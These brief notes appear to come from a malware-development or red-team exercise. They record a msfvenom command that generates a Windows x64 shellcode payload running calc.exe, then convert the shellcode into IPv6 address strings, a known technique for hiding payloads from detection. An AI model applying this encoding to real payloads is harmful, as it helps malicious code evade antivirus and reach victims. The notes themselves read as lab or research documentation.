generated exec calc.exe payload with
`.\msfvenom.bat -p windows/x64/exec CMD=calc.exe -f raw --pad-nops -n 288 -o calc-payload-nops.bin`
and converted it to IPv6 format with the `payload-to-ipv6-str.c` program

link with ntdll with
`cl module.c ntdll.lib`

rewrote `payload-to-ipv6-str.c` using `RtlIpv6AddressToStringA` function instead of the custom `printf` format.
This function formats the IPv6 string in the abbreviated format with no leading zeros and multiple zeros collapsed with `::`